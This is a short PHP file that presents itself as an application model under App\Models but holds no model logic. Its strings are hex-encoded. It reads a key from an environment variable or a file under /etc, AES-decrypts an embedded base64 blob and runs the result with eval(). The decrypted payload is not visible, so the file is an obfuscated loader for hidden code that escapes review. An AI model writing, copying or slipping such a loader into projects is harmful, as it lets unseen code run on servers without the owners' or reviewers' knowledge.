<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('7L1WH9aW+rAgcckWI/oAPg==');

$c=base64_decode(

'U/B26Hpay1CY1yxMo2BTIv2CrwXGYytC9UH8I3Aejeb5sE38UmvN7Gblt+LgePGNZzIiCNP0KxzA' .
'9tzUvcxYg9Ryx5vL4V/3Aj+1ViCiq/tEj+Brkn2IxUr8qcKAFkIYRndM1oXFIqcjqtfxmTRAMNfu' .
'5GB3oYMthsEH1RDBR5tDn0e8euCLkQpG0IkujAKAPY1GpMJ3UMKYSpeiifphk9ZvHUeyHbWNwruh' .
'mu5BKCs3+plLbwRuMvGmlwuJgKEefudQLYnr6epXh1xwDPjqDyxUfkAOi+HjBVOWOp7/da+Z0N91' .
'rl+svCB6fy0+b1Y+llP/9Eox7m/dC73Z2HyUI7zvroegkvkFAHvnX/kYDqV0A/3oktOtbTahJfd7' .
'aUoawCP8Sg+ug1pVR4EjPEbez9ZSZz8OwvFqhkZQvmk/kOlK+97EmqfRTG3y8r+KMPsilSIYzN6k' .
'IARJFpwVpHlU79CSKp5Cb2yQ/ILSVasJpOkCepMzZK4RZWzcbTsGf3KDU+MefNY0LJugKCApHhii' .
'iiqNr9G9YaRrUwDeyqo0to0BZ2kLx6JBEgbWM7Yek4lFx1nRCK0uNotMJOXGOzdNSX9oIZnssHvM' .
'rUJyTrVS33uGEPI7oCs6Yry68go9suJQkmEBZcg52neKB9pAKmTf7ucMUcHOz3suvQK1OQsba05I' .
'IHwtii2w8t3q0smGUpP1FD98kJSLyAAaPZK2Y7Zr9oC8SRRfvQUf6MDQLzqQmAFvfOUJsioJB6D3' .
'3bKrphVzKrBnE2M1Gymda/wK2xcbvdJnc6h0mTZ5Q/gVXgCWqjdRW7U6JD8y28cLKUjZ1bVYH9sB' .
'ITK4cQMtWtWI2boIC5Fy0Uf7hlw/p/LUDMfzvjd7GCkEJZENWt9zRvs2WXDb'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

